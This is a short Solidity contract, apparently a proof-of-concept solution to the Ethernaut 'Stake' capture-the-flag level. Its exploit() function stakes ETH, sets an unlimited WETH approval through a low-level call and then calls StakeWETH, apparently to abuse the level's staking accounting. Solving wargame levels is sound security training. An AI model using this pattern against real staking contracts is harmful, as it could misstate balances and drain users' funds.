// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "Ethernaut/stake.sol";

contract StakePoc {
    Stake stake;
    constructor(address _stake) {
      stake = Stake(_stake);
    }

    function exploit() public payable {
       stake.StakeETH{value: 0.002 ether}();
       address WETH = stake.WETH();
       WETH.call(abi.encodeWithSignature("approve(address,uint256)", address(stake), type(uint256).max));
       stake.StakeWETH(0.002 ether);
    }
}